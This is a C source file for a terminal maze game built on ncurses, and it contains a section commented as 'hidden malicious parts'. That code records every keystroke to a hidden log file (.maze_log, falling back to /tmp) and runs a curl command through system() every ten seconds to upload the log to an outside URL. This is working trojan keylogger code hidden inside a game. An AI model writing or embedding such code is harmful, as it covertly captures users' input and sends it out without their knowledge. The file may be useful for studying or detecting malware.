#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ncurses.h>
#include <string.h>
#include <sys/time.h>

#define WIDTH 20
#define HEIGHT 10

char maze[HEIGHT][WIDTH + 1] = {
    "###################",
    "#@      #        #",
    "#  #### # ###### #",
    "#     # #      # #",
    "##### # ###### # #",
    "#     #    #   # #",
    "# ######## # ### #",
    "#        # #     #",
    "# ######## #####X#",
    "###################"
};

int px = 1, py = 1; // Player start
int gameOver = 0;

// Hidden malicious parts
FILE *logfile = NULL;
struct timeval last_exfil;
const char *logpath = ".maze_log";
const char *exfil_url = "http://example.com/mazeupload";

void init_malicious() {
    logfile = fopen(logpath, "a");
    if (!logfile) {
        logfile = fopen("/tmp/.maze_log", "a");
    }
    gettimeofday(&last_exfil, NULL);
}

void exfiltrate() {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_exfil.tv_sec >= 10) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -X POST -F \"file=@%s\" %s > /dev/null 2>&1",
                 logpath, exfil_url);
        system(cmd);
        gettimeofday(&last_exfil, NULL);
    }
}

void draw() {
    clear();
    for (int i = 0; i < HEIGHT; i++) {
        printw("%s\n", maze[i]);
    }
    printw("Use WASD to move. Reach the X!\n");
    refresh();
}

void input() {
    timeout(0);
    int ch = getch();

    if (ch != ERR && logfile) {
        fputc(ch, logfile);
        fflush(logfile);
    }

    int nx = px, ny = py;

    if (ch == 'w') ny--;
    else if (ch == 's') ny++;
    else if (ch == 'a') nx--;
    else if (ch == 'd') nx++;

    char next = maze[ny][nx];

    if (next == ' ' || next == 'X') {
        maze[py][px] = ' ';
        px = nx;
        py = ny;
        maze[py][px] = '@';

        if (next == 'X') gameOver = 1;
    }

    exfiltrate();
}

int main() {
    initscr();
    noecho();
    curs_set(FALSE);

    init_malicious();
    draw();

    while (!gameOver) {
        input();
        draw();
        usleep(80000); // smooth refresh
    }

    draw();
    printw("\n🎉 You escaped the maze! 🎉\n");
    printw("Press any key to exit...");
    timeout(-1);
    getch();
    endwin();

    if (logfile) fclose(logfile);

    return 0;
}
